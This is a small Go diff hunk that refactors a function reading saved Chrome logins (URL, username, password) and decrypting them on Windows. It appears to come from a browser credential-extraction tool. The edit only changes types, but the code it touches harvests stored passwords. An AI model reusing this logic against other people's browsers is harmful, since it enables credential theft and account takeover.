@@ -78,11 +78,11 @@ func getWindowsChromePassword() []ChromePasswordStruct {
 		var username string
 		var password string
 		_ = rows.Scan(&url, &username, &password)
-		decryptedPassword := utils.WindowsDecrypt([]byte(password))
+		decryptedPassword := utils.WindowsDecrypt(password)
 		result = append(result, ChromePasswordStruct{
 			Url:      url,
 			UserName: username,
-			Password: string(decryptedPassword),
+			Password: decryptedPassword,
 		})
 	}
 	return result
